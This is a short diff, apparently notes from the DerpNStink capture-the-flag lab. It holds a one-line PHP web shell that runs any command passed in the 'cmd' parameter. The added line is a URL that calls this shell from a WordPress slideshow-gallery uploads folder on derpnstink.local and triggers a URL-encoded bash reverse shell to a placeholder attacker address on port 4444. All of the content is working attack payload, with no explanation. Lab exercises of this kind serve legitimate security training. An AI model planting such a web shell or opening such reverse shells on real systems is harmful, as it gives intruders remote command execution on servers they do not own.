@@ -1,1 +1,3 @@
 <?php system($_GET['cmd']); ?>
+
+http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'
